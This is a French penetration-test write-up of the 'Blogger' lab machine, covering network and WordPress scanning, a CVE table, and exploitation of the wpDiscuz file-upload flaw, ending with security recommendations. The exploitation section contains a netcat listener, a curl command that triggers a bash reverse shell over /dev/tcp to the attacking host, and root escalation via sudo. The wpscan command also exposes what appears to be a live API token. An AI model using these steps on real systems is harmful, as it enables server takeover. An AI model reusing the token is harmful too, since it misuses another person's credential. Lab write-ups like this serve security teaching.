# 📌 Rapport de Vulnérabilité - Blogger

## 📖 Sommaire

1. [📝 Introduction](#-introduction)
   - 🎯 Objectif
   - 🌍 Informations sur l'Environnement

2. [🔍 Découverte du Réseau](#-1-découverte-du-réseau)
   - 🔎 Scan du Réseau Local

3. [🚀 Analyse des Ports et Services](#-2-analyse-des-ports-et-services)
   - 🛠 Scan Nmap

4. [🌐 Exploration du Site Web](#-3-exploration-du-site-web)
   - 🖥 Accès au Site Web
   - 📂 Recherche de Contenus Cachés avec Dirb
   - 🛠 Ajout d'une Entrée dans le Fichier Hosts

5. [🔥 Scan de Vulnérabilités WordPress](#-4-scan-de-vulnérabilités-wordpress)
   - 🏴 Utilisation de WPScan

6. [🔴 Vulnérabilités Critiques](#-vulnérabilités-critiques)
7. [⚠️ Vulnérabilités Élevées](#-7-vulnerabilites-elevees)
8. [🟠 Vulnérabilités Moyennes](#-vulnérabilités-moyennes)
9. [🟡 Vulnérabilités Faibles](#-vulnérabilités-faibles)

10. [🚀 Exploitation de la Faille Critique wpDiscuz](#-5-exploitation-de-la-faille-critique-wpdiscuz)
    - 🎯 Exploitation de la Vulnérabilité d’Upload de Fichier
    - 📂 Étape 1 : Création du Fichier Malveillant
    - ⏳ Étape 2 : Lancement d’une Écoute sur Kali
    - 📤 Étape 3 : Upload du Fichier Malveillant
    - 🎉 Étape 4 : Prise de Contrôle

11. [⚠️ Exploitation Potentielle et Risques](#-11-exploitation-potentielle-et-risques)
    - 🔑 Vulnérabilités Identifiées
    - 🚨 Risques et Conséquences

12. [🛡️ Recommandations de Sécurité](#-12-recommandations-de-securite)

---

## 📝 Introduction

### 🎯 Objectif
L'objectif de ce rapport est d'identifier et d'exploiter les vulnérabilités de la machine cible "Blogger".

### 🌍 Informations sur l'Environnement
- **IP cible :** `192.168.1.4`
- **IP de la machine d'attaque :** `192.168.1.X`
- **Outils utilisés :** `netdiscover`, `nmap`, `dirb`, `wpscan`

---

## 🔍 1. Découverte du Réseau

### 🔎 Scan du Réseau Local
Un scan du réseau a été réalisé pour détecter les machines actives à l'aide de `netdiscover` :

```bash
sudo netdiscover -r 192.168.1.0/24
```

Une machine avec l’IP `192.168.1.4` a été détectée.

![image](https://github.com/user-attachments/assets/b6b1c037-3b74-4804-8232-aacc448f5422)

---

## 🚀 2. Analyse des Ports et Services

### 🛠 Scan Nmap
Un scan approfondi a été réalisé avec `nmap` pour identifier les services exposés et leurs versions :

```bash
nmap -sS -sC -sV -A -O -vvv 192.168.1.4
```

**Résultats :**
| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH X.X |
| 80   | HTTP    | Apache/WordPress |

On constate que **deux ports sont ouverts** : 
- **Port 22 (SSH)** 
- **Port 80 (HTTP)**

Le **port 80** héberge un service web accessible via un navigateur.

![image7](https://github.com/user-attachments/assets/4d79c829-77d3-4597-bf01-ed05cb9aa17d)
![image8](https://github.com/user-attachments/assets/0e9aa5c5-e8ad-42e2-920d-c9acb4b900da)

---

## 🌐 3. Exploration du Site Web

### 🖥 Accès au Site Web
En entrant l'adresse `http://192.168.1.4` dans le navigateur, une page web s'affiche.

![image](https://github.com/user-attachments/assets/7f8b1882-1a00-4b75-b9a2-535b2619cf0d)

### 📂 Recherche de Contenus Cachés avec Dirb
Un scan avec `dirb` a été effectué pour découvrir des répertoires cachés :

```bash
dirb http://192.168.1.4
```

**Résultats :**
- **Répertoire découvert :** `/assets/fonts/blog`
- Ce répertoire contient une instance **WordPress**.

![image10](https://github.com/user-attachments/assets/ef33f844-e003-4e48-b7d7-a1c3a7b7dc2c)

### 🛠 Ajout d'une Entrée dans le Fichier Hosts
Pour faciliter l’accès, un alias `blogger.thm` a été ajouté dans le fichier `/etc/hosts` :

```bash
echo "192.168.1.4 blogger.thm" | sudo tee -a /etc/hosts
```

---

## 🔥 4. Scan de Vulnérabilités WordPress

### 🏴 Utilisation de WPScan
Un scan approfondi a été réalisé sur WordPress pour détecter les vulnérabilités :

**Commande exécutée :**
```bash
wpscan --url http://192.168.1.4/assets/fonts/blog --plugins-detection mixed --enumerate ap --api-token=B4ZGWKhJHufoRPD6PAzqdQlraiSHRxinJF6zzaa6qtY
```

---

## 🔴 **Vulnérabilités Critiques**
| Plugin/Vulnérabilité | Description |
|----------------------|-------------|
| **WordPress Core** | Exécution de code à distance (CVE-2019-8942, CVE-2019-8943) |
| **WordPress Core** | Problème avec les tokens de réinitialisation de mot de passe (CVE-2020-11027) |
| **Plugin wpDiscuz** | Téléchargement de fichiers arbitraires non authentifié (CVE-2020-24186) |
| **Plugin wpDiscuz** | Injection SQL non authentifiée (CVE-2023-3869) |

---

## ⚠️ **Vulnérabilités Élevées**
| Plugin/Vulnérabilité | Description |
|----------------------|-------------|
| **WordPress Core** | Injection XSS via l'upload de fichiers (CVE-2020-11026) |
| **WordPress Core** | Suppression arbitraire de fichiers (CVE-2018-20147) |
| **WordPress Core** | Injection XSS via l'éditeur de blocs (CVE-2019-16781, CVE-2019-16780) |
| **WordPress Core** | Contournement des permissions administratives (CVE-2019-17675) |
| **Plugin wpDiscuz** | Injection de contenu non authentifiée (CVE-2023-46310) |
| **Plugin wpDiscuz** | Faille d'autorisation permettant modification de contenu (CVE-2023-3998) |

---

## 🟠 **Vulnérabilités Moyennes**
| Plugin/Vulnérabilité | Description |
|----------------------|-------------|
| **WordPress Core** | Accès non authentifié aux brouillons et contenus privés (CVE-2019-17671) |
| **WordPress Core** | Injection d'objets PHP via métadonnées (CVE-2018-20148) |
| **WordPress Core** | Empoisonnement du cache des requêtes JSON (CVE-2019-17673) |
| **Plugin wpDiscuz** | XSS stocké via la soumission de commentaires (CVE-2023-47185) |
| **Plugin wpDiscuz** | Manque d'autorisation dans les actions AJAX (CVE-2023-45760) |

---

## 🟡 **Vulnérabilités Faibles**
| Plugin/Vulnérabilité | Description |
|----------------------|-------------|
| **WordPress Core** | XSS stocké via des liens spécifiques (CVE-2019-20042) |
| **WordPress Core** | Problème d'indexation des écrans d'activation utilisateurs (CVE-2018-20151) |
| **WordPress Core** | Vulnérabilité XSS sur Apache via l'upload de fichiers (CVE-2018-20149) |
| **WordPress Core** | Vulnérabilité XSS dans l'assainissement des URLs (CVE-2019-16222) |
| **Plugin Akismet** | Version obsolète avec failles connues |

---

## **Légende des niveaux de risque**
🔴 **Critique** : Peut compromettre entièrement le site.  
⚠️ **Élevé** : Risque de compromission sévère.  
🟠 **Moyen** : Accès partiel aux données ou altération de contenu.  
🟡 **Faible** : Moins d'impact, souvent exploitable avec des privilèges existants.  

---

🚀 **Actions recommandées :**
- **Mettre à jour immédiatement** WordPress et ses plugins.
- **Désactiver XML-RPC** pour éviter les attaques externes.
- **Restreindre les permissions des fichiers et dossiers sensibles.**
- **Appliquer un pare-feu WAF** pour bloquer les attaques XSS et injections SQL.

📌 **Prochaine étape :** Effectuer un audit approfondi du serveur et des logs pour détecter toute compromission.

---

## 🚀 5. Exploitation de la Faille Critique wpDiscuz

### 🎯 Exploitation de la Vulnérabilité d’Upload de Fichier
Après avoir identifié la vulnérabilité critique sur **wpDiscuz**, nous allons tenter d’exploiter l’upload de fichiers malveillants.

### 📂 Étape 1 : Création du Fichier Malveillant
Dans le fichier `reverse.php`, nous ajoutons une signature GIF pour contourner les restrictions :

![image4](https://github.com/user-attachments/assets/6a7da93c-c14b-4139-a91b-6ba34dc72eac)
![image1](https://github.com/user-attachments/assets/95a8c8ff-6529-41a0-b6f1-80a8ed5101c4)

### ⏳ Étape 2 : Lancement d’une Écoute sur Kali
Nous démarrons un listener Netcat sur le port `4444` :

```bash
nc -lvnp 4444
```

![image9](https://github.com/user-attachments/assets/55122fb4-63fc-4e00-b0b8-3cc3cee4f63a)

### 📤 Étape 3 : Upload du Fichier Malveillant
Nous utilisons la vulnérabilité du plugin pour uploader `reverse.php` sur le serveur WordPress.

![image6](https://github.com/user-attachments/assets/68bcf9ac-ec3c-42bf-bf33-27758463a259)

### 🎉 Étape 4 : Prise de Contrôle
Une fois le fichier uploadé, nous exécutons la commande suivante pour déclencher le shell inversé :

```bash
curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.X/4444 0>&1'"
```

### 🚨 Exploitation Additionnelle
#### Après établissement de la connexion :
- **Lancement d'un shell** : Après la connexion réussie via le fichier malveillant, je lance un shell pour interaction directe.
![image13](https://github.com/user-attachments/assets/586db230-3c5c-4168-bfc8-4df1e1125d54)
- **Recherche d'utilisateurs** : J'effectue une recherche des utilisateurs ayant accès au bash pour identifier les comptes utilisateurs potentiels à exploiter.
![image6](https://github.com/user-attachments/assets/8527a26e-9e32-40cf-b4f0-826900248989)
- **Passage sur un terminal bash classique** : Migration de l'interpréteur de commandes vers un shell bash plus stable et complet.
![image3](https://github.com/user-attachments/assets/6bad3863-5bf6-4075-a29a-17ebed8a5eb9)
- **Test de différentes connexions** : J'essaye de me connecter à l'utilisateur `root` puis à l'utilisateur `vagrant` pour évaluer les niveaux d'accès disponibles.
![image1](https://github.com/user-attachments/assets/b870f668-dd09-4534-91be-14710dd6dd57)
- **Exécution de la commande `sudo -l`** : Cette commande permet de lister les droits sudo de l'utilisateur courant pour identifier d'autres vecteurs d'escalade de privilèges.
![image15](https://github.com/user-attachments/assets/9ef2b073-2169-4971-9af2-fbf7454b3fad)
- **Connexion au compte root** : Utilisation de la commande `sudo su` pour accéder au compte root sans nécessité de mot de passe, confirmant une faille majeure dans la gestion des privilèges.

✅ **Nous obtenons un shell interactif sur la machine cible !**

---

## ⚠️ 6. Exploitation Potentielle et Risques

### 🔑 Vulnérabilités Identifiées
1. **WordPress obsolète** : Potentiel XSS et SQL Injection.
2. **Plugins vulnérables** : Certains plugins non mis à jour contiennent des failles exploitables.
3. **Exposition du service SSH** : Potentiellement bruteforcable.

### 🚨 Risques et Conséquences
- **Prise de contrôle de l’instance WordPress**
- **Éventuel accès aux fichiers sensibles**
- **Possibilité d’escalade de privilèges via un plugin vulnérable**

---

## 🛡️ 7. Recommandations de Sécurité

1. **Mettre à jour WordPress et ses plugins** pour combler les failles connues.
2. **Restreindre l'accès au SSH** en limitant les connexions aux adresses IP de confiance.
3. **Désactiver les plugins inutilisés** et renforcer la configuration des permissions.
4. **Mettre en place un pare-feu (WAF)** pour filtrer les requêtes malveillantes.
5. **Auditer régulièrement la sécurité du serveur** pour détecter d’éventuelles nouvelles failles.
